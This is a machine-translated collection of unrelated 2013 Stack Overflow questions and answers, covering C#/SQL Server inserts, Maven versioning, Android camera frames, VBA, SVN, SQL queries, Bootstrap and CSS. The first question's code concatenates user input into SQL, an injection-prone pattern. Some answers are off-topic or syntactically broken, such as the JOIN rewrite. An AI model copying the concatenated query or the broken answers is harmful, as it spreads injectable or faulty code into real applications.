> 赞同：0
> 
> 时间：2013-04-01T06:13:18.163
> 
> 标签：sql-server-2008

我在 SQL Server 2008 中有数据库，我想`11:05`通过文本框将时间插入为 ()，而我的表的数据类型为`DATETIME`。

我正在使用这段代码：

```
SqlConnection con = new SqlConnection("Data Source=NOMAN-PC;Initial Catalog=parking;Integrated Security=True");        

string qry = "Insert Into vehicle_log values('" +DropDownList_vehType.SelectedItem+ "','" + TextBox_RegNo.Text + "',@Time_in)";        
SqlCommand cmd = new SqlCommand(qry, con);

TimeSpan Time_in = TimeSpan.Parse(TextBox_timeIn.Text + ":" + TextBox_timemin.Text);
cmd.Parameters.Add("@Time_in" ,System.Data.SqlDbType.DateTime ).Value = Time_in;

con.Open();
cmd.ExecuteNonQuery();
con.Close(); 
```

单击按钮出现以下错误：

> 对象必须实现 IConvertible。

我是 ASP.NET 和 SQL Server 的新手，我将感谢您的指导。

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:17:36.500

首先设置时间变量，然后将 $now 放在您想要显示时间的任何位置，例如

```
$now = date("Y-m-d H:i:s");
echo $now; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:18:56.833

1）。尝试更改**DropDownList_vehType.SelectedItem.Text**上的**DropDownList_vehType.SelectedItem**

2）。你**必须**使用参数来避免注入

3）。您可以使用 AddWithValue 方法而不是 Add ( [http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparametercollection.addwithvalue.aspx](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparametercollection.addwithvalue.aspx) )

# javascript - 当我在浏览器的另一个选项卡中活动时，焦点事件不起作用（js | jquery）

> ID：15738539
> 
> 赞同：0
> 
> 时间：2013-04-01T06:14:26.970
> 
> 标签：javascript, jquery, focus

我有一个输入元素，`id='idtxt'`我想在它上面设置值包括符号 | 光标，我使用`focus()`事件来做到这一点

> document.getElementById('idtxt').value = 'mytxt'; //我的txt|
> document.getElementById('idtxt').focus();

但`focus()`另一方面，如果我在此浏览器选项卡中处于活动状态，就可以工作！如果我在另一个选项卡中处于活动状态，那就错了。我想，当我在另一个选项卡中时，我的光标在我想要处理插入文本和签名 | 的那个上不可用，并且`focus()`不工作。很难找到这个错误，因为如果我回到另一个选项卡，标志| 是站在正确的位置。那么我必须做些什么来解决这个问题？

1.  模拟器我要处理的选项卡中的光标和 focus() 可以是正确的工作。为什么要这样做？
2.  或插入一个ascii 字符看起来像符号| 并且忽略`focus()`或光标在选项卡中处于活动状态，它真的存在吗？
3.  或为我解决此问题的任何解决方案建议。谢谢

# excel - 如何使用 Lotus Script 更改 Excel 中的复选框标签？

> ID：15738551
> 
> 赞同：0
> 
> 时间：2013-04-01T06:15:24.517
> 
> 标签：excel, lotus-notes, lotus-domino, lotusscript

我需要在 excel 列中动态添加复选框。我已使用以下宏生成的代码添加。但我不允许我检查生成的复选框的标签，请帮助我解决以下问题......

生成动态复选框的代码

```
xlSheet.CheckBoxes.Add(660, chkheight, 72, 72).Select 
```

当我尝试使用以下代码更改复选框标签时。它创造了问题。

```
Selection.Characters.Text = "TEST" 
```

请任何人帮忙。在此先感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:48:36.160

尝试这个：

```
xlSheet.Selection.Characters.Text = "TEST" 
```

# java - 包括从 pom.xml 到应用程序包的应用程序版本号

> ID：15738553
> 
> 赞同：12
> 
> 时间：2013-04-01T06:15:28.463
> 
> 标签：java, maven, build, version

每个`pom.xml`都有：

```
<groupId>com.vendor</groupId>
<artifactId>product</artifactId>
<version>1.0.13.0-dev</version>  <!-- THIS FIELD -->
<packaging>war</packaging> 
```

`version`一块与应用程序捆绑在一起很有用，因此用户可以查看和报告它们。

但我不喜欢代码重复，并寻找一种方法来避免将带有版本信息的属性文件放入 VCS（Git/SVN），因为每次我增加版本时，我都必须提交到两个地方（`pom.xml`和`version.properties`）。

我可以通过哪种方式在 Java 应用程序中以编程方式提供**版本**属性？`pom.xml`

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-05-27T15:32:22.440

找到了一个使用[maven-war-plugin](http://maven.apache.org/plugins/maven-war-plugin/examples/adding-filtering-webresources.html)更优雅的解决方案。

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-war-plugin</artifactId>
    <version>2.3</version>
    <configuration>
       <webResources>
           <resource>
               <targetPath>WEB-INF/views/jsp</targetPath>
               <directory>${basedir}/src/main/webapp/WEB-INF/views/jsp</directory>
               <includes>
                  <include>footer.jsp</include>
               </includes>
               <filtering>true</filtering>
          </resource>
      </webResources>
  </configuration>
</plugin> 
```

footer.jsp 然后有：

```
Application Version: ${project.version} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-02T11:24:42.630

下面是我的个人*制作*解决方案。

**pom.xml**：

```
<?xml version="1.0" encoding="utf-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <version>1.0.13.0-dev</version>

    <build>
        <resources>
            <resource>
                <directory>src/main/resources</directory>
                <filtering>true</filtering>
            </resource>
        </resources>
     ... 
```

**base.jsp**：

```
<%@taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<!DOCTYPE html>
<html>
<head></head>
<body>
   <a href='<c:url value="/"/>'>
     <spring:eval expression="@props.getProperty('version')"/>
   </a>
   <jsp:include page="${contentPage}" />
</body>
</html> 
```

**项目属性**：

```
version=${project.version} 
```

**应用上下文.xml**：

```
<bean id="props" class="org.springframework.beans.factory.config.PropertiesFactoryBean" autowire="byName" >
    <property name="location" value="classpath:proj.properties"/>
</bean>

<bean id="propertyConfigurer" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
    <property name="location" value="classpath:proj.properties"/>
</bean> 
```

要不就

```
<util:properties id="props" location="classpath:proj.properties"/> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-04-01T10:33:30.913

看看[Maven 资源插件](http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html)。在您的`version.properties`（应该在`resources`文件夹中）中，定义类似`version=${project.version}`. 确保为插件打开过滤（所有在上面的链接中都有详细描述），你应该很高兴！

只需运行`mvn resources:resources`（或`mvn compile`）并检查生成的文件。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-01T10:34:10.497

您可以简单地配置[maven-war-plugin、maven-jar-plugin、maven-ear-plugin](http://maven.apache.org/shared/maven-archiver/index.html)，如下所示：

```
 <plugin>
   <groupId>org.apache.maven.plugins</groupId>
   <artifactId>maven-war-plugin</artifactId>
   <version>${maven-war-plugin.version}</version>
   <configuration>
     <archive>
       <addMavenDescriptor>true</addMavenDescriptor>
       <index>true</index>
       <manifest>
         <addDefaultImplementationEntries>true</addDefaultImplementationEntries>
         <addDefaultSpecificationEntries>true</addDefaultSpecificationEntries>
       </manifest>
       <manifestEntries>
          <artifactId>${project.artifactId}</artifactId>
          <groupId>${project.groupId}</groupId>
          <version>${project.version}</version>
       </manifestEntries>
     </archive>
   </configuration>
 </plugin> 
```

[可以使用 jacabi](http://www.jcabi.com/jcabi-manifests/index.html)从 manifest.mf 中读取信息。

# java - 相机视频的 PreviewCallback

> ID：15738554
> 
> 赞同：0
> 
> 时间：2013-04-01T06:15:30.460
> 
> 标签：java, android, android-camera

有人可以为我提供使用 PreviewCallback 接口读取相机视频每一帧的示例代码或示例吗？

我想在不使用表面的情况下获取帧，因为我首先想要相机视频的帧而不显示在屏幕上，然后我可以将该帧传递给 cocos2dx 的 CCLayer。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:30:42.170

这是一个缓慢的过程，无法处理传递给预览回调的每一帧数据。仅当您对实时预览应用程序的要求无法显示来自相机的视频或来自带有*模板*类型覆盖的相机的视频时，才应使用它，并且您的显示器每秒只能容忍几帧和一些延迟。

**一些重要步骤**：

1.  您的 Activity 必须扩展 Surface Holder，并且您不应该在创建表面之前启动相机。
2.  预览版仅支持每个设备上的特定尺寸（*我检查的最后一个设备上的 480 x 320 - 一段时间前*），但您的请求不会引起任何问题，它只会被忽略。当您最终收到预览回调时，请检查`onPreviewFrame()`.
3.  `byte[]`发送到的数组数据`onPreviewFrame()`为 YCbCr_422_SP 格式。没有其他格式可用，即使您尝试设置它们。数据在这里描述：[http ://groups.google.com/group/android-developers/msg/d3b29d3ddc8abf9b](http://groups.google.com/group/android-developers/msg/d3b29d3ddc8abf9b)
4.  不要尝试解码`onPreviewFrame()`. 没有足够的时间 - 如果您尝试在该功能中保持系统这么长时间，您将用软管冲洗相机。将数据复制到您自己的缓冲区并在单独的`Thread`.
5.  `Thread` 在处理任何特定帧时，您将不得不跳过对接收​​到的新帧的处理。等到`Thread`完成后再使用下一个可用帧中的数据。

**解码 YUV 预览数据**：

```
// decode Y, U, and V values on the YUV 420 buffer 
// described as YCbCr_422_SP by Android - David Manpearl
public static void decodeYUV(int[] out, byte[] fg, int width, int 
height) throws NullPointerException, IllegalArgumentException { 
        final int sz = width * height; 
        if(out == null) throw new NullPointerException("buffer 'out' is null"); 
        if(out.length < sz) throw new IllegalArgumentException("buffer 'out' size " + out.length + " < minimum " + sz); 
        if(fg == null) throw new NullPointerException("buffer 'fg' is null"); 
        if(fg.length < sz) throw new IllegalArgumentException("buffer 'fg' size " + fg.length + " < minimum " + sz * 3/ 2); 
        int i, j; 
        int Y, Cr = 0, Cb = 0; 
        for(j = 0; j < height; j++) { 
                int pixPtr = j * width; 
                final int jDiv2 = j >> 1; 
                for(i = 0; i < width; i++) { 
                        Y = fg[pixPtr]; if(Y < 0) Y += 255; 
                        if((i & 0x1) != 1) { 
                                final int cOff = sz + jDiv2 * width + (i >> 1) * 2; 
                                Cb = fg[cOff]; 
                                if(Cb < 0) Cb += 127; else Cb -= 128; 
                                Cr = fg[cOff + 1]; 
                                if(Cr < 0) Cr += 127; else Cr -= 128; 
                        } 
                        int R = Y + Cr + (Cr >> 2) + (Cr >> 3) + (Cr >> 5); 
                        if(R < 0) R = 0; else if(R > 255) R = 255; 
                        int G = Y - (Cb >> 2) + (Cb >> 4) + (Cb >> 5) - (Cr >> 1) + (Cr >> 3) + (Cr >> 4) + (Cr >> 5); 
                        if(G < 0) G = 0; else if(G > 255) G = 255; 
                        int B = Y + Cb + (Cb >> 1) + (Cb >> 2) + (Cb >> 6); 
                        if(B < 0) B = 0; else if(B > 255) B = 255; 
                        out[pixPtr++] = 0xff000000 + (B << 16) + (G << 8) + R; 
                } 
        } 
} 
```

**将`byte[]`数组转换为`Bitmap`**：

```
Bitmap bitmap = BitmapFactory.decodeByteArray(out , 0, out.length); 
```

# excel - 以下条件的Vba Excel公式（循环引用）

> ID：15738558
> 
> 赞同：1
> 
> 时间：2013-04-01T06:15:37.240
> 
> 标签：excel, vba

![在此处输入图像描述](https://i.stack.imgur.com/843dB.png)

* * *

嗨，我试着输入一个公式，比如`ActiveCell.FormulaR1C1 = "=IF(RC[-1]=""India"",RC,"""")"`如果国家不是**印度**，那么 Check1、Check2 和 Check3 应该为空，否则它们应该显示自己的值。当我试图输入该公式时，excel 给了我循环引用警告。我只想要那个公式。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:19:20.303

当一个公式直接或间接地引用它自己的单元格时，它会创建一个循环引用。

```
ActiveCell.FormulaR1C1 = "=IF(RC[-1]=""India"",RC,"""")" 
```

您在 activecell 中编写公式，公式说明是否**RC[-1]="India"** 以及它的真实**RC**是否与 activecell 相同。因此，您会收到循环引用错误。

但是，如果您将这个公式放在下面的**E 列**中，它将起作用。

```
Range("E2:E" & lastRow).FormulaR1C1 = "=IF(RC[-4]=""India"",RC[-3],"""")" 
```

或者，下面是简单的 VBA 代码。

```
Sub sample()
    Dim lastRow As Long
    lastRow = Range("A65000").End(xlUp).Row

    For i = 2 To lastRow
        If (InStr(1, Cells(i, 1), "India") <= 0) Then
            Range("B" & i & ":D" & i).Clear
        End If
    Next
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T11:04:22.297

您**不能**仅将`RC`其用作结果，因为它引用了当前公式。

**选项 1：**您需要有另一个单元格作为验证单元格，例如以下将在当前单元格的左侧创建一个单元格：

```
ActiveCell.Offset(0,1).FormulaR1C1 = "=IF(RC[-2]=""India"",RC[-1],"""")" 
```

**注释后的选项 2：**如果您的代码行仅在左侧单元格不是**印度**的情况下清除当前单元格值，则使用以下命令：

```
If ActiveCell.Offset(0,-1).Value <> "India" Then ActiveCell.Value = "" 
```

**选项 3：**如果您在 RC 中的默认值必须保留，但如果 R​​C[-1] 的值变为不等于**印度**，则需要一个公式来覆盖它，您必须在公式中硬编码您的值，如下所示：

```
ActiveCell.FormulaR1C1 = "=IF(RC[-1]=""India"",""" & ActiveCell.Value & ""","""")" 
```

# ios - 在Phonegap生成的App store中部署.ipa文件？

> ID：15738559
> 
> 赞同：28
> 
> 时间：2013-04-01T06:15:44.667
> 
> 标签：ios, cordova, jquery-mobile

我使用 Phonegap 创建了一个 iOS 应用程序。我还注册了苹果开发者计划并生成了所有必需的证书。现在，我想将此 .ipa 文件部署到应用商店。我现在必须做什么才能将此 .ipa 文件发布到应用商店？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-08-20T04:50:40.577

下面概述了如何将 PhoneGap 应用程序提交到 App Store，也就是 iTunes Connect。令人惊讶的是，PhoneGap 似乎没有提供这些说明。

1.  在 iOS Provisioning Portal 中，创建[分发证书](https://developer.apple.com/library/ios/documentation/IDEs/Conceptual/AppDistributionGuide/CodeSigningYourApps/CodeSigningYourApps.html)。作为此过程的一部分，您将使用 Keychain Manager 创建分发证书。`Certificates.p12`通过右键单击该证书并选择“导出”来导出该证书。记录密码，因为每次在 build.phonegap.com 上进行构建时都需要它。

2.  在 iOS Provisioning Portal 中，为您的应用创建一个应用 ID。

3.  创建一个 App Store 分发配置文件，并确保您使用与上述相同的私钥/证书对其进行签名。下载它。

4.  现在转到[build.phonegap.com](https://build.phonegap.com/)并转到您的 iOS 版本，然后“添加密钥...”。将其称为“App Store”并上传`.p12`文件和`.mobileprovision`文件。

5.  从 PhoneGap Build 重建并下载 IPA 文件。

6.  确保您的应用程序在 iTunes Connect中设置为[准备上传二进制文件。](https://developer.apple.com/library/ios/DOCUMENTATION/LanguagesUtilities/Conceptual/iTunesConnect_Guide/8_AddingNewApps/AddingNewApps.html#//apple_ref/doc/uid/TP40011225-CH13-SW22)

7.  使用Xcode 附带的[Application Loader](https://developer.apple.com/library/ios/documentation/LanguagesUtilities/Conceptual/iTunesConnect_Guide/Chapters/SubmittingTheApp.html#//apple_ref/doc/uid/TP40011225-CH33-SW8)上传应用程序（另请参阅[在 Mac 中哪里可以找到 Application Loader 应用程序？ ）。](https://stackoverflow.com/questions/8094317/where-to-found-the-installed-application-loader-app-in-mac)您将上传 IPA 文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T08:09:01.433

准备好提交文件后，您`.ipa`只需访问[https://itunesconnect.apple.com](https://itunesconnect.apple.com)上的 iTunes Connect ，为您的应用创建记录，然后填写所需信息。从[官方文档](http://developer.apple.com/library/ios/#documentation/General/Conceptual/ApplicationDevelopmentOverview/DeliverYourAppontheAppStore/DeliverYourAppontheAppStore.html)：

> iTunes Connect 中的记录包含捆绑 ID 字段；您在此字段中输入的值必须与您的应用的捆绑 ID 完全匹配。某些 Apple 技术（包括 Game Center 和应用内购买）要求在开发过程的早期创建 iTunes Connect 记录。例如，对于应用内购买，您需要创建应用记录，以便您可以添加要销售的商品的详细信息。此内容需要在开发过程完成之前创建，以便您可以使用它来测试您添加的代码以实现应用内购买。

因此，这应该只是通过 iTunes Connect 提交您的应用程序并等待批准的问题。

# svn - 如何列出我今天在 SVN 中提交的文件？

> ID：15738560
> 
> 赞同：3
> 
> 时间：2013-04-01T06:16:00.073
> 
> 标签：svn

我想检查我今天提交了哪些文件

我努力了 `svn log | grep 'name' | grep '2013-04-01'`

但它削减了我的评论和我提交的文件

感谢所有答案

我搜索类似的东西`svn log -commited_by me`

最后我做到了

```
svn log -v `svn log -q -r {2013-04-01}:{2013-04-02} | grep myname | cut -d"|" -f1 | sed 's/r/\-r/g'` 
```

我觉得很长:^(

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T08:54:36.920

您可以指定一个日期`svn log`，这将为您提供该日期的最新修订。您还可以使用范围内的日期，例如，您可以使用：

```
svn log -r {2013-03-26}:{"2013-03-26 23:59"} 
```

您应该注意修订*是“该日期的最新修订”，*因此第一个修订是在前一天。（在题为*“Subversion a Day Early?”的*[文档](http://svnbook.red-bean.com/en/1.7/svn.tour.revs.specifiers.html)中有一个注释）因此，上面的例子可以很容易地写成：

 *```
svn log -r {2013-03-26}:{2013-03-27} 
```

现在您在原始问题中提到“今天”，因此您可以构建一个自动输入日期的命令。现在该`date`命令可以为您获取今天的日期：

```
date "+%Y-%m-%d" 
```

和明天的约会

```
date -v+1d "+%Y-%m-%d" 
```

所以你可以结合这些方法：

```
svn log -r {`date "+%Y-%m-%d"`}:{`date -v+1d "+%Y-%m-%d"`} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T05:51:43.093

1.  您**必须阅读** [SVN Book](http://svnbook.red-bean.com/en/1.7/index.html)，至少要阅读[Revision Specifiers](http://svnbook.red-bean.com/en/1.7/svn.tour.revs.specifiers.html)（不要错过“Is Subversion a Day Early？”部分并**理解**它）主题和`svn help log`
2.  您**必须学会**为您回答评论中的问题

之后（如果您想从“简单尝试”尝试中排除第一个修订版，则借助一些代码行以获得修订版范围）您可以获得所需的结果。

有可能：

*   `svn log -q -v -r BEGIN:END`
*   `svn diff --summarize -r BEGIN:END`

（diff 不包含“噪音”，只有 a/ 没有重复的文件列表 b/ 每个受影响文件的状态指示器）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-06-25T18:01:04.483

@borrible 的回答涵盖了日期范围，@Lazy Badger 的回答涵盖了文件列表，所以我将介绍问题的其余部分——将结果限制在您的范围内。

您可以使用以下`--search`选项进行过滤：

> 作者、日期、日志消息文本（除非使用 --quiet），或者，如果还提供了 --verbose 选项，则更改路径。

假设你的 svn 用户名是“Jing”，我们可以把所有的答案放在一起得到：

```
svn log --quiet --verbose --revision {`date "+%Y-%m-%d"`}:{`date -v+1d "+%Y-%m-%d"`} --search Jing path/to/repo/root 
```

在哪里`--quiet`抑制提交消息`--verbose`并使文件路径出现。您必须包含存储库根目录的路径（在磁盘或 URL 上）以包含所有更改，而不仅仅是在当前文件夹中。

您将获得如下所示的结果：

```
------------------------------------------------------------------------
r468951 | Jing | 2021-06-23 13:16:03 -0700 (Wed, 23 Jun 2021)
Changed paths:
   M /project/filter.py
------------------------------------------------------------------------
r468952 | Jing | 2021-06-23 13:19:34 -0700 (Wed, 23 Jun 2021)
Changed paths:
   M /project/filter.py
   M /project/results.py
------------------------------------------------------------------------ 
```

要查看唯一文件路径的列表，请添加`| grep "^ " | sort -u`到命令。

*不幸*的是svn 的过滤是有限的，所以如果你的**用户名也出现在 filepaths 中**，你将不得不使用类似[pysvn](https://pypi.org/project/svn/)的东西来过滤结果。

另外，请注意，如果您使用本地路径，则**只会包含您已同步的结果**。如果您想要本地还没有的结果，则需要传递 url。*

# database - 使用 IN 的 SQL 查询。我想在 EXISTS 中转换查询

> ID：15738561
> 
> 赞同：0
> 
> 时间：2013-04-01T06:16:05.277
> 
> 标签：database

```
SELECT 
    lpn.TC_LPN_ID 
FROM LPN lpn 
WHERE lpn.inbound_Outbound_Indicator = 'O' 
    AND lpn.tc_company_id = 1403 
    AND lpn.TC_REFERENCE_LPN_ID **IN**  
        (SELECT 
            l.tc_lpn_id 
         FROM lpn l 
         WHERE l.TC_COMPANY_ID = 1403 
             AND l.inbound_Outbound_Indicator = 'I' 
             AND (l.tc_lpn_id= '000990950' OR l.TC_REFERENCE_LPN_ID = '000990950')) 
```

想将我的查询修改为**EXISTS**。

**EXISTS**提高性能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:19:18.690

```
SELECT lpn.tc_lpn_id
  FROM lpn lpn
 WHERE lpn.inbound_outbound_indicator = 'O'
   AND lpn.tc_company_id = 1403
   AND EXISTS (
          SELECT 1
            FROM lpn l
           WHERE lpn.tc_reference_lpn_id = l.tc_lpn_id
             AND l.tc_company_id = 1403
             AND l.inbound_outbound_indicator = 'I'
             AND (   l.tc_lpn_id = '000990950'
                  OR l.tc_reference_lpn_id = '000990950'
                 )) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T13:00:56.857

JOIN 进一步提高了性能。

您可以将查询表达为对其自身的标准内部联接：

```
SELECT 
    lpn.TC_LPN_ID 
FROM LPN
JOIN lpn l
    ON l.TC_COMPANY_ID = lpn.l.TC_COMPANY_ID
    AND l.tc_lpn_id = lpn.TC_REFERENCE_LPN_ID
    AND l.inbound_Outbound_Indicator = 'I'
    AND l.tc_lpn_id = '000990950' OR l.TC_REFERENCE_LPN_ID = '000990950')
WHERE lpn.inbound_Outbound_Indicator = 'O' 
AND lpn.tc_company_id = 1403 
```

请注意，我删除了`lpn`对自身的无意义别名 - 即`FROM LPN lpn`与简单相同`FROM LPN`：将表别名为其自己的名称无效。

# windows - 执行命令时批量显示文本

> ID：15738568
> 
> 赞同：0
> 
> 时间：2013-04-01T06:16:46.550
> 
> 标签：windows, batch-file, cmd, system, profile

我试图弄清楚我是否可以显示诸如“请稍候，我们完成您的设置”之类的内容，同时还执行命令而不在批处理文件中显示命令的处理。例如。**Systeminfo**它必须在显示结果之前加载一些东西，但我不希望它显示诸如“加载网卡信息”或“加载修补程序信息”之类的东西，我只希望它显示结果。

这就是我能想到的，但没有奏效。

```
@echo off
color a
cls
echo.
echo.
echo Please wait...
@systeminfo
pause >nul 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:47:50.037

我相信你/d必须尝试

```
START /wait /min "" CMD /c systeminfo ^>sysinfo.txt 
```

它应该将 SYSINFO 数据输出到 sysinfo.bat

如果您愿意，有很多关于如何静默运行的参考资料。就目前而言，在执行时将创建一个最小化的窗口`SYSINFO`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:38:55.423

在 XP 上试试这个命令：

```
systeminfo 2>nul 
```

# twitter-bootstrap - Twitter Bootstrap 以不同的方式呈现 HTML 元素周围的换行符

> ID：15738573
> 
> 赞同：1
> 
> 时间：2013-04-01T06:17:04.340
> 
> 标签：twitter-bootstrap

我在这里报告的问题一直让我发疯，因为我认为这是一个 CSS 问题。事实证明，Bootstrap 以不同的方式呈现我的表单之一，具体取决于 HTML 中是否包含换行符。在一种情况下，控件被渲染时它们之间没有可见的空间，而在另一种情况下，它们之间的间距很好。

你可以在这里看到效果：http: [//jsfiddle.net/JTvH7/1/](http://jsfiddle.net/JTvH7/1/)

在代码中，表单重复了两次。标记是相同的，除了第一个版本都在一行上，第二个版本被整理并在元素之间有换行符。

```
<form><div class="form-horizontal"><select id="species"><option value="cat">Cat</option><option value="dog">Dog</option></select><button class="btn btn-primary">Next&nbsp;<i class="icon-chevron-right icon-white"></i></button><button class="btn btn-warning">Cancel</button></div></form>

<form>
    <div class="form-horizontal">
        <select id="Select2">
            <option value="cat">Cat</option>
            <option value="dog">Dog</option>
        </select>
        <button class="btn btn-primary">Next&nbsp;<i class="icon-chevron-right icon-white"></i></button>
        <button class="btn btn-warning">Cancel</button>
    </div>
</form> 
```

![渲染输出](https://farm9.staticflickr.com/8404/8609252728_83a13c33c2_d.jpg)

我真的很想自动生成我的一些 HTML（使用 jQuery .html），这意味着我将把全在线版本注入到我的页面中，因此渲染不正确。一个丑陋的基本解决方法是放在`&nbsp;`控件之间，但我非常想避免这种情况。

有没有人遇到并克服了这个问题？我很想在 Bootstrap 的 github 上报告它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:36:49.067

问题是浏览器将空格、换行符和制表符解释为单个空格。所以这与`&nbsp;`他们之间的存在是一样的。

定位按钮的正确方法是使用 css。例如，引导程序有`.btn-toolbar`按钮类。您只需要为选择添加一些 css 规则。

```
.btn-toolbar > select + .btn {
    margin-left: 5px;
} 
```

[http://jsfiddle.net/JTvH7/2/](http://jsfiddle.net/JTvH7/2/)

# asp.net-mvc - 如何在不使用标签生成器的情况下在 MVC Razor 中制作自定义强类型扩展方法？

> ID：15738577
> 
> 赞同：2
> 
> 时间：2013-04-01T06:17:31.673
> 
> 标签：asp.net-mvc, razor

我是 MVC 框架的新手，所以请对我温柔一点。我想在不使用 Tag Builder 类的情况下制作强类型的自定义扩展方法。我一直在网上搜索一个
带有解释的例子，但我找不到任何解决方案。请帮我。下面是自定义扩展方法的代码，请告诉我如何将其转换为强类型。

```
public static MvcHtmlString DateOfBirth(this HtmlHelper helper)
    {
        var text = @"<div>
    <select style=""width: 40px"">";
    for (int i = 1; i <= 31; i++)
    {
        if (i < 10)
        {
            text += "<option>" + 0 + +i + "</option>";
        }
        else
        {
            text += "<option>" + i + "</option>";
        }
    }
text += "</select>";
text += "<select style=\"width: 40px\">";
    for (int i = 1; i <= 12; i++)
    {
        if (i < 10)
        {
            text += "<option>" + 0 + +i + "</option>";
        }
        else
        {
            text += "<option>" + i + "</option>";
        }

    }
 text += "</select>";
 text += "<select style=\"width: 60px\">";
    var date = System.DateTime.Now.Year;
    for (int i = 1950; i <= date; i++)
    {
        text += "<option>"+i+"</option>";
    }
 text += "</select>";
text += "</div>";

        return new MvcHtmlString(text);

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:35:21.293

当这个类正是为此目的而设计时，你为什么不想使用 TagBuilder 呢？你更喜欢写一些标签汤？不。

这里：

```
using System;
using System.Linq;
using System.Linq.Expressions;
using System.Web;
using System.Web.Mvc;
using System.Web.Mvc.Html;

public static class HtmlExtensions
{
    public static IHtmlString DateOfBirthFor<TModel>(
        this HtmlHelper<TModel> html, 
        Expression<Func<TModel, DateTime>> ex
    )
    {
        var days = Enumerable.Range(1, 31).Select(x => new SelectListItem 
        { 
            Value = x.ToString(),
            Text = x.ToString()
        });
        var months = Enumerable.Range(1, 12).Select(x => new SelectListItem
        {
            Value = x.ToString(),
            Text = x.ToString()
        });
        var years = Enumerable.Range(1950, DateTime.Now.Year - 1949).Select(x => new SelectListItem
        {
            Value = x.ToString(),
            Text = x.ToString()
        });

        var result = new TagBuilder("div");
        DateTime dob = (DateTime)ModelMetadata.FromLambdaExpression(ex, html.ViewData).Model;

        result.InnerHtml = string.Concat(
            html.DropDownList("Day", new SelectList(days, "Value", "Text", dob.Day), new { width = "40px" }).ToHtmlString(),
            html.DropDownList("Month", new SelectList(months, "Value", "Text", dob.Month), new { width = "40px" }).ToHtmlString(),
            html.DropDownList("Year", new SelectList(years, "Value", "Text", dob.Year), new { width = "60px" }).ToHtmlString()
        );

        return new HtmlString(result.ToString());
    }
} 
```

接着：

```
@model MyViewModel
...
@Html.DateOfBirthFor(x => x.Dob) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:29:55.830

使用定义：

```
public static MvcHtmlString DateOfBirth<TModel> (this HtmlHelper<TModel>)
{ 
   // ...
} 
```

然后它将绑定到特定的 TModel HtmlHelper。

# c - Dev-C++ 和 xcode 编译器的不同输出

> ID：15738588
> 
> 赞同：-2
> 
> 时间：2013-04-01T06:18:29.470
> 
> 标签：c, xcode, dev-c++

当我编译以下代码时，它会在不同的环境中给出不同的输出。

> ```
> int a=4;
> a = ++a + ++a;
> printf("%d",a); 
> ```

在 Dev-C++ 中编译它会给出 12，而在 xcode LLVM 编译器中它会给出 11 作为输出。

另外，当我编译以下代码时

> ```
> int a=4;
> a = ++a + ++a + ++a;
> printf("%d",a); 
> ```

它在 Dev-C++ 中给出 19 个，在 xcode LLVM 编译器中给出 18 个。

任何人都可以向我解释一下吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T10:35:18.303

以下代码：

```
a = ++a + ++a; 
```

和

```
a = ++a + ++a + ++a; 
```

都是**Undefined Behavior**的例子，所以结果取决于编译器、平台等。

请查看 K&R 的“The C Programming Language”，第 2.12 节

# php - 我的评论用完了评论框

> ID：15738592
> 
> 赞同：0
> 
> 时间：2013-04-01T06:18:38.910
> 
> 标签：php, html, css

在我的网站上，我允许用户使用名称和图片发表评论。我注意到一个问题，当有人使用 html 代码在评论中发布更大的图片时，它会用完评论框。所以我想要的只是东西应该留在评论框中。无论他们发布多大的图片。我已经在下面发布了所有详细信息，请帮助谢谢：|

![在此处输入图像描述](https://i.stack.imgur.com/mYGbf.jpg)

我的html

```
<div class="mycomment">
        <div id="postpic">
            <img id="profile_pic" width="50px" height="150px" src="image/user/1.gif" class="">
        </div>
        <div class="mycommentpost">                     
            <a class="postername" href="profile.php?userID=1">Deepak Kumar: </a><br>
            <img src="http://i00.i.aliimg.com/wsphoto/v0/789295022/-font-b-Easter-b-font-day-font-b-Bunny-b-font-ears.jpg" width="650" height="350" alt="">
        </div>
</div> 
```

我的CSS：

```
.mycomment {
font-weight: normal;
color: #000000;
border: 2px solid #DEDEDE;
letter-spacing: 1pt;
font-family: arial, helvetica, sans-serif;
float: left;
width: 550px;
margin: 20px 0;
}

#postpic {
float: left;
width: 70px;
}

.mycommentpost {
font-weight: normal;
color: #000000;
letter-spacing: 1pt;
width: 480px;
float: right;
}

.postername {
color: #580000;
font-weight: bold;
font-size: 1em;
text-decoration: none;
} 
```

这里的评论只是一张图片：

```
